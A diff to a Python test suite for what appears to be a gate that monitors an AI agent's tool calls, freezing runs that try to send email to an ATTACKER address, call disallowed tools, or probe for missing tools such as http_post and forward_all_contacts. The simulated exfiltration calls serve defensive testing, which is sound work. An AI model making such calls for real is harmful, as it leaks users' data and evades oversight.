@@ -62,7 +62,9 @@ def test_attack_freezes_only_that_run(api):
     decision = check(api, bad_id, bad_auth, "send_email", to=ATTACKER, subject="x", body="rows")
     assert decision.json()["decision"] == "freeze"
     assert decision.json()["rule_id"] == "DEST_NOT_ALLOWED"
-    assert api.get(f"/runs/{bad_id}/wait?timeout=0.05", headers=bad_auth).json() == {
+    wait_path = f"/runs/{bad_id}/wait"
+    wait_params = {"timeout": 0.05, "call_id": decision.json()["call_id"]}
+    assert api.get(wait_path, params=wait_params, headers=bad_auth).json() == {
         "status": "frozen"}
     assert api.get(f"/runs/{ok_id}").json()["status"] == "running"  # others continue
 
@@ -70,7 +72,7 @@ def test_attack_freezes_only_that_run(api):
     assert incident["run_id"] == bad_id and incident["next_action"] == "detonate"
 
     api.post(f"/runs/{bad_id}/unfreeze", json=HUMAN)
-    assert api.get(f"/runs/{bad_id}/wait", headers=bad_auth).json() == {"status": "running"}
+    assert api.get(wait_path, params=wait_params, headers=bad_auth).json() == {"status": "running"}
 
 
 def test_kill_and_stop_revoke(api):
@@ -172,8 +174,9 @@ def test_a_model_typo_tool_does_not_freeze_but_a_disallowed_tool_does(api):
     gate.agents["meeting_assistant"].allow.tools.remove("export_contacts")
     run_id, auth = start(api)
     typo = check(api, run_id, auth, "search_contactschannelcommentary", query="x").json()
-    assert (typo["decision"], typo["rule_id"]) == ("allow", "UNKNOWN_TOOL")
+    assert (typo["decision"], typo["rule_id"]) == ("block", "UNKNOWN_TOOL")
     assert api.get(f"/runs/{run_id}").json()["status"] == "running"
+    assert api.get("/incidents").json() == []
     known = check(api, run_id, auth, "export_contacts").json()  # the agent has it, not allowed
     assert (known["decision"], known["rule_id"]) == ("freeze", "TOOL_NOT_ALLOWED")
 
@@ -183,7 +186,9 @@ def test_probing_for_missing_tools_escalates_to_a_freeze(api):
     for _ in range(3):  # garbled real tool names are never probes
         assert check(api, run_id, auth, "search_contactschannelcommentary", query="x").json()["rule_id"] == "UNKNOWN_TOOL"
     first = check(api, run_id, auth, "http_post", url="https://x.example").json()
-    assert (first["decision"], first["rule_id"]) == ("allow", "UNKNOWN_TOOL")
+    assert (first["decision"], first["rule_id"]) == ("block", "UNKNOWN_TOOL")
+    assert api.get(f"/runs/{run_id}").json()["status"] == "running"
+    assert api.get("/incidents").json() == []
     second = check(api, run_id, auth, "forward_all_contacts", to=ATTACKER).json()
     assert (second["decision"], second["rule_id"], second["layer"]) == ("freeze", "ESCALATION", "hard_rule")
     assert "http_post, forward_all_contacts" in second["explanation"]
